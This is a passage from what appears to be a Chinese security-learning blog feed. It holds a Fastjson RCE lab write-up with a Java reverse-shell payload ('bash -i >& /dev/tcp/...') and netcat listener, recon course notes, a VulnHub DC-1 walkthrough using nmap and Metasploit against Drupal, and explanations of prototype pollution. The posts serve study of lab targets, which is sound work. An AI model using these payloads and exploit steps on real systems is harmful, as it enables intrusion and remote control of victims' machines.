class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/172.20.0.1/4563 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                        pc.waitFor();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// do nothing</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目的就是把test.txt上传到目标主机 </p><p>然后进行编译 Javac reverse.java</p><p>然后我们在环境目录下起一个http服务 这一步部署rmi指定的文件下载服务器</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/007d447d-9ddc-4927-a3f5-1ce87e375326.png"></p><p>端口为5623</p><p>然后部署rmi服务器</p><p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/de6ca6b9-8cda-4cb2-80a9-bec740601853.png"></p><p>端口为8520</p><p>接着去web页面抓包</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/5cff3b0f-4fe6-4187-ba58-5b3a37871df1.png"></p><p>发包前先nc -lvp 4563</p><p>发包发现成功反弹shell</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/223a33e5-0d7d-45da-9eb4-52096a2f9f52.png"></p><p>写的比较好的文章<a href="https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/">https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fastjson1-2-24-RCE漏洞&quot;&gt;&lt;a href=&quot;#Fastjson1-2-24-RCE漏洞&quot; class=&quot;headerlink&quot; title=&quot;Fastjson1.2.24-RCE漏洞&quot;&gt;&lt;/a&gt;Fastjson1.2.24-RCE漏洞&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="fastjson" scheme="https://gu0f3n.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪的第二天</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
    <published>2025-03-03T04:17:54.000Z</published>
    <updated>2025-03-08T01:42:28.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等<br>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等<br>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他等<br>4、打点-Web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p><p>区分windows 和Linux 可以用 大写小写来区分</p><p>windows上对文件的大小写不区分 </p><p>也可以通过ping网站来判断 一般 window de ttl&gt;100 Linux&lt;100</p><p>数据判断 搭建组合 端口扫描</p><p>#知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p><p> 源码泄露</p><p>cms识别 云溪</p><p>管理员习惯不好 备份泄露</p><p>配置不当 git 泄露 |发布代码时候 没有将.git删除 直接同步上传道服务器其上</p><p> svn泄露 ds_Store泄露|同步发布道服务器上</p><p>php特性 composer.json 泄露 配置性说明性 文件 获得相关信息  </p><p>下载配合 WEB-INF泄露 必须要下载文件的漏洞 </p><p>GITHUB泄露 语法搜索&amp;管检测搜索</p><p>获取网络信息-服务厂商&amp;网络架构<br>获取服务信息-应用协议&amp;内网资产<br>获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p><p>内网资产查询  </p><p>旁注：同服务器下面的不同WEB应用查询技术<br>C段：同网段下面的不同服务器IP下的WEB应用查询技术</p><p>旁注查询 </p><p>c段查询 ip反查域名</p><p>cdn 查询 超级ping 去测试全国对其访问的速度来检测网站开通了cdn</p><p>网站waf  区分</p><p>超级ping：CDN服务识别<br>Masscan：端口扫描，应用协议<br>Wafw00f：Web应用防护防火墙识别<br>Nmap：端口扫描，应用协议，防火墙识别<br>lbd：负载均衡，广域网负载均衡，应用层负载均衡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息打点&quot;&gt;&lt;a href=&quot;#信息打点&quot; class=&quot;headerlink&quot; title=&quot;信息打点&quot;&gt;&lt;/a&gt;信息打点&lt;/h1&gt;&lt;p&gt;1、打点-Web架构-语言&amp;amp;中间件&amp;amp;数据库&amp;amp;系统等&lt;br&gt;2、打点-Web源码-CMS开源&amp;amp;</summary>
      
    
    
    
    
    <category term="dixodisec" scheme="https://gu0f3n.github.io/tags/dixodisec/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪第一天</title>
    <link href="https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
    <published>2025-02-28T12:17:15.000Z</published>
    <updated>2025-03-14T11:20:03.845Z</updated>
    
    <content type="html"><![CDATA[<p>跟着小迪学习第一天</p><p>名词解释</p><p>POC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。<br>EXP：全称’Exploit’，中文利用，指利用系统漏洞进行攻击的动作。<br>Payload：中文有效载荷，指成功exploit之后，真正在目标系统执行的代码或指令。<br>Shellcode：简单翻译’shell代码’，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。</p><p>网站搭建前置知识</p><p>域名 子域名 DNS http&#x2F;https 证书</p><p>web应用框架架构 </p><p>理解不同web应用组成校色功能框架 </p><p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等<br>开发语言：asp,php,aspx,jsp,java,python,ruby,go,html,javascript等<br>程序源码：根据开发语言分类；应用类型分类；开源CMS分类；开发框架分类等<br>中间件容器：IIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfish等|支撑网站运行，各有不同的功能<br>数据库类型: Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDB等|存储数据，根据不同需求，应用不同的数据库类型<br>服务器操作系统：Windows系列，Linux系列，Mac系列等|<br>第三方软件：phpmyadmin,vs-ftpd,VNC,ELK,Openssh等 </p><p>#WEB应用安全漏洞分类（程序源码）<br>SQL注入，文件安全，RCE执行，XSS跨站，CSRF&#x2F;SSRF&#x2F;CRLF，<br>反序列化，逻辑越权，未授权访问，XXE&#x2F;XML，弱口令安全等</p><p>web请求的过程 <a href="https://www.cnblogs.com/51benpao/p/12984951.html">https://www.cnblogs.com/51benpao/p/12984951.html</a> </p><p>浏览器输入域名-&gt;浏览器dns解析到ip地址-&gt;服务器和客户机建立tcp(三次握手)连接-&gt;浏览器通过http协议发送请求数据包-&gt;可能某些服务会做重定向来负载均衡-&gt;浏览器跟踪重定向地址重新开始连接过程-&gt;服务器处理请求-&gt;服务器发出html响应-&gt;释放tcp连接-&gt;浏览器显示页面（此时还没有完全接受到html全部的文档）-&gt;发送剩余的内容</p><p>web请求数据包<a href="https://www.cnblogs.com/rayray/p/3729533.html">https://www.cnblogs.com/rayray/p/3729533.html</a></p><p>学会不同对象采用不同抓包封包抓取技术分析</p><p>基于网络接口抓包-网络接口<br>基于程序进程抓包-程序进程<br>基于数据协议抓包-HTTP&#x2F;S&amp;TCP&amp;UDP<br>基于应用对象抓包-APP&amp;小程序&amp;PCUI<br>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX</p><p>存储密码加密-Web&amp;数据库&amp;系统<br>传输数据编码-各类组合传输参数值<br>代码特性加密-JS&amp;PHP&amp;NET&amp;JAVA<br>数据显示编码-字符串数据显示编码</p><p> 详细点：<br>密码存储加密：<br>MD5 SHA1 NTLM AES DES RC4<br>MD5值是32或16位位由数”0-9”和字母”a-f”所组成的字符串<br>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40<br>NTLM这种加密是Windows的哈希密码，标准通讯安全协议<br>AES，DES，RC4这些都是非对称性加密算法，引I入密钥，密文特征与Base64类似<br>应用场景：各类应用密文，自定义算法，代码分析，CTF安全比赛等</p><p>NTLM介绍 <a href="https://blog.csdn.net/qq_62169455/article/details/132617592">https://blog.csdn.net/qq_62169455/article/details/132617592</a></p><p>后端代码加密：<br>PHP .NET JAVA<br>PHP：乱码，头部有信息<br>.NET：DLL封装代码文件<br>JAVA:JAR&amp;CLASS文件<br>举例：Zend ILSpy IDEA<br>应用场景：版权代码加密，开发特性，CTE比赛等</p><p>编译和反编译 <a href="https://zhuanlan.zhihu.com/p/4766970">https://zhuanlan.zhihu.com/p/4766970</a> <a href="https://blog.csdn.net/weixin_44943389/article/details/132507440">https://blog.csdn.net/weixin_44943389/article/details/132507440</a></p><p>#知识点：<br>1、资产架构-端口目录插件接口多站点多应用<br>2、番外安全-域名c服务器本身服务厂商管理人员<br>3、考虑阻碍-站库分离&amp;CDN&amp;WAF&amp;负载均衡&amp;主机防护<br>详细点：<br>1、前置条件-购买使用-云服务器域名等<br>2、架构搭建-目录c端口子域c插件s应用等<br>3、安全部署-WAE防火墙&amp;主机防护&amp;HIDS等<br>4、性能优化-负载均衡&amp;CDN加速cOSS云存储等</p><p><strong>资产架构</strong>：<br>WEB单个源码指向安全 |<br>WEB多个目录源码安全 |可能会有多个程序，就有多个漏洞 扫描软7bscan<br>WEB多个端口源码安全 | nmap<br>服务器架设多个站点安全|<br>架设第三方插件接口安全|<br>服务器架设多个应用安全|<br>#番外安全：<br>基于域名解析安全 |<br>基于服务器本身安全<br>基于服务商信息安全<br>基于管理个人的安全<br>#考虑阻碍：<br>阻碍-站库分离|<br>阻碍-CDN加速服务|<a href="https://zhuanlan.zhihu.com/p/616462418">https://zhuanlan.zhihu.com/p/616462418</a><br>阻碍-负载均衡服务|<a href="https://www.sangfor.com.cn/knowledge/load-balancing|%E5%8F%AF%E8%83%BD%E8%8E%B7%E5%BE%97%E7%9A%84%E6%98%AF%E5%A4%87%E7%94%A8%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.sangfor.com.cn/knowledge/load-balancing|可能获得的是备用机的权限</a><br>阻碍-WAF应用防火墙|</p><p>阻碍-主机防护防火墙|服务器杀毒软件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;跟着小迪学习第一天&lt;/p&gt;
&lt;p&gt;名词解释&lt;/p&gt;
&lt;p&gt;POC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。&lt;br&gt;EXP：全称’Exploit’，中文利用，指利用系统漏洞进行攻击的动作。&lt;br&gt;Payload：中文有效载荷，指成功ex</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub DC-1</title>
    <link href="https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/"/>
    <id>https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/</id>
    <published>2025-02-16T09:28:03.000Z</published>
    <updated>2025-03-05T05:28:18.717Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       (Unknown)</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       (Unknown)</span><br><span class="line">192.168.205.129 00:0c:29:04:0c:de       (Unknown)</span><br><span class="line">192.168.205.254 00:50:56:e2:1c:01       (Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.874 seconds (136.61 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>发现192.168.205.129 是我们的靶机ip 开始信息搜集</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sS -sV -A -T4 -p- 192.168.205.129</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:26 EST</span><br><span class="line">Nmap scan report for 192.168.205.129</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          44174/udp6  status</span><br><span class="line">|   100024  1          46616/tcp   status</span><br><span class="line">|   100024  1          46812/udp   status</span><br><span class="line">|_  100024  1          46918/tcp6  status</span><br><span class="line">46616/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:04:0C:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.205.129</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds</span><br></pre></td></tr></table></figure><p>得到22 80 111 三个端口</p><p>22是ssh 80是http服务 </p><p>首先进入web页面看一看有什么</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250216173216.png"></p><p>一个登录页面 拿一下网站的基本信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# whatweb -v 192.168.205.129</span><br><span class="line">WhatWeb report for http://192.168.205.129</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Welcome to Drupal Site | Drupal Site</span><br><span class="line">IP        : 192.168.205.129</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14], Script[text/javascript], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]   </span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server for modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services in sync with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.2.22 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ Content-Language ]</span><br><span class="line">        Detect the content-language setting from the HTTP header. </span><br><span class="line"></span><br><span class="line">        String       : en</span><br><span class="line"></span><br><span class="line">[ Drupal ]</span><br><span class="line">        Drupal is an opensource CMS written in PHP. </span><br><span class="line"></span><br><span class="line">        Aggressive function available (check plugin file or details).</span><br><span class="line">        Google Dorks: (1)</span><br><span class="line">        Website     : http://www.drupal.org</span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Debian Linux</span><br><span class="line">        String       : Apache/2.2.22 (Debian) (from server string)</span><br><span class="line"></span><br><span class="line">[ JQuery ]</span><br><span class="line">        A fast, concise, JavaScript that simplifies how to traverse </span><br><span class="line">        HTML documents, handle events, perform animations, and add </span><br><span class="line">        AJAX. </span><br><span class="line"></span><br><span class="line">        Website     : http://jquery.com/</span><br><span class="line"></span><br><span class="line">[ MetaGenerator ]</span><br><span class="line">        This plugin identifies meta generator tags and extracts its </span><br><span class="line">        value. </span><br><span class="line"></span><br><span class="line">        String       : Drupal 7 (http://drupal.org)</span><br><span class="line"></span><br><span class="line">[ PHP ]</span><br><span class="line">        PHP is a widely-used general-purpose scripting language </span><br><span class="line">        that is especially suited for Web development and can be </span><br><span class="line">        embedded into HTML. This plugin identifies PHP errors, </span><br><span class="line">        modules and versions and extracts the local file path and </span><br><span class="line">        username if present. </span><br><span class="line"></span><br><span class="line">        Version      : 5.4.45-0+deb7u14</span><br><span class="line">        Google Dorks: (2)</span><br><span class="line">        Website     : http://www.php.net/</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : pass (from field name)</span><br><span class="line"></span><br><span class="line">[ Script ]</span><br><span class="line">        This plugin detects instances of script HTML elements and </span><br><span class="line">        returns the script language/type. </span><br><span class="line"></span><br><span class="line">        String       : text/javascript</span><br><span class="line"></span><br><span class="line">[ UncommonHeaders ]</span><br><span class="line">        Uncommon HTTP server headers. The blacklist includes all </span><br><span class="line">        the standard headers and many non standard but common ones. </span><br><span class="line">        Interesting but fairly common headers should have their own </span><br><span class="line">        plugins, eg. x-powered-by, server and x-aspnet-version. </span><br><span class="line">        Info about headers can be found at www.http-stats.com </span><br><span class="line"></span><br><span class="line">        String       : x-generator (from headers)</span><br><span class="line"></span><br><span class="line">[ X-Powered-By ]</span><br><span class="line">        X-Powered-By HTTP header </span><br><span class="line"></span><br><span class="line">        String       : PHP/5.4.45-0+deb7u14 (from x-powered-by string)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Sat, 15 Feb 2025 23:03:39 GMT</span><br><span class="line">        Server: Apache/2.2.22 (Debian)</span><br><span class="line">        X-Powered-By: PHP/5.4.45-0+deb7u14</span><br><span class="line">        Expires: Sun, 19 Nov 1978 05:00:00 GMT</span><br><span class="line">        Last-Modified: Sat, 15 Feb 2025 23:03:39 +0000</span><br><span class="line">        Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">        ETag: &quot;1739660619&quot;</span><br><span class="line">        Content-Language: en</span><br><span class="line">        X-Generator: Drupal 7 (http://drupal.org)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 2276</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><p>这里可以看到靶机的cms是Drupal</p><p>***启动Metersploit*****<em><strong>服务*</strong></em></p><p>搜寻drupal模块</p><p>使用序号一这个</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 1</span><br><span class="line"></span><br><span class="line">set Rhost 192.168.29.131 *# s设置靶机ip*</span><br><span class="line"></span><br><span class="line">set lhost 192.168.29.128 *# 设置攻机ip*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">run#</span><span class="language-bash">开始攻击</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┌──(root㉿kali)-[/home/kali]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/categories/vulnhub/"/>
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>js原型链污染初探</title>
    <link href="https://gu0f3n.github.io/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/"/>
    <id>https://gu0f3n.github.io/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/</id>
    <published>2024-11-25T02:36:10.000Z</published>
    <updated>2024-11-25T06:03:24.721Z</updated>
    
    <content type="html"><![CDATA[<p>Learn from:<a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a></p><p>先放一张图</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732502203084.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js 是由对象组成的，对象与对象之间存在着继承关系</span><br><span class="line"></span><br><span class="line">每个对象都有一个指向它的原型的内部链接，而这个原型对象又有他自己的原型，直到 null 为止</span><br><span class="line"></span><br><span class="line">整体看来就是多个对象层层继承，实例对象的原型链接形成了一条链，也就是 js 的原型链</span><br><span class="line"></span><br><span class="line">在 js 中每个函数都有一个 prototype 属性，而每个对象中也有一个 **proto** 属性用来指向实例对象的原型</span><br><span class="line"></span><br><span class="line">而每个原型也都有一个 constructor 属性执行相关联的构造函数，我们就是通过构造函数生成实例化的对象</span><br></pre></td></tr></table></figure><p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p><p>这幅图的原型链是 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</span><br></pre></td></tr></table></figure><p><strong>原型链污染通常出现在对象</strong>，<strong>数组的键名或者属性名可控</strong>，同时是赋值语句的情况下 ( 通常使用 json 传值 )</p><p>Learn form:<a href="https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p>师傅讲的很详细</p><p><strong>prototype和__proto__的区别</strong></p><p>在 JavaScript 中，每个对象都有一个 <code>__proto__</code> 属性，它指向该对象的原型。原型是一个对象，也可以有自己的原型，这样就形成了一个原型链。同时，每个函数也有一个 <code>prototype</code> 属性，它是一个对象，当该函数作为构造函数创建实例时，实例对象的 <code>__proto__</code> 属性会指向该构造函数的 <code>prototype</code> 属性，这样就可以实现属性和方法的继承。</p><p>区别在于：</p><ul><li><code>prototype</code>属性是函数所独有的，而<code>__proro__</code>属性是每个对象都有的（再强调一次，函数也是js对象）</li><li><code>prototype</code> 属性指向一个对象，它是用来存储属性和方法，这些属性和方法可以被该函数的实例对象所继承。而 <code>__proto__</code> 属性指向该对象的原型，它是用来实现对象之间的继承。简单来说就是<code>functionName.prototype===varName.__proto__</code>，都可以访问到对象的原型。</li></ul><h2 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h2><p><strong>概念</strong></p><p>一句话概括原型链污染：如果修改了一个对象的原型，那么会影响所有来自于这个原型的对象，这就是原型链污染。</p><p>原型链污染通常出现在对象，数组的键名或者属性名可控，同时是赋值语句的情况下 （简单来说就是键名和键值都可控情况下），将键名设置为<code>__proto__</code>就可以利用赋值语句修改原型对象，进而实现原型链污染，常见的危险函数有merge和clone。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Learn from:&lt;a href=&quot;https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html&quot;&gt;https://wiki.wgpsec.org/knowledge/ctf/js-pro</summary>
      
    
    
    
    <category term="pollute" scheme="https://gu0f3n.github.io/categories/pollute/"/>
    
    
    <category term="nodejs" scheme="https://gu0f3n.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2024-11-22T07:12:18.000Z</published>
    <updated>2024-11-25T04:52:55.992Z</updated>
    
    <content type="html"><![CDATA[<p>leran from :<a href="https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><h1 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h1><p>这个知识点应用的范围比较小，仅当题目中出现<code>utils</code>的<code>merge</code>或<code>Pydash</code>模块中的<code>set</code>和<code>set_with</code>函数才会用上</p><p>首先经典回顾一下python的类与继承：</p><ul><li>在Python中，定义类是通过<code>class</code>关键字，<code>class</code>后面紧接着是类名，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，所有类的本源都是object类</li><li>可以自由地给一个实例变量绑定属性，像js</li><li>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把类内置的属性绑上</li><li>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</li><li>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到</li><li>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断。</li></ul><p>在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。</p><h2 id="DASCTF-2023-0X401七月暑期挑战赛-EzFlask"><a href="#DASCTF-2023-0X401七月暑期挑战赛-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask"></a>[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)<span class="comment">#用于创建一个 Flask 应用实例</span></span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())<span class="comment">#设置 Flask 应用的密钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span 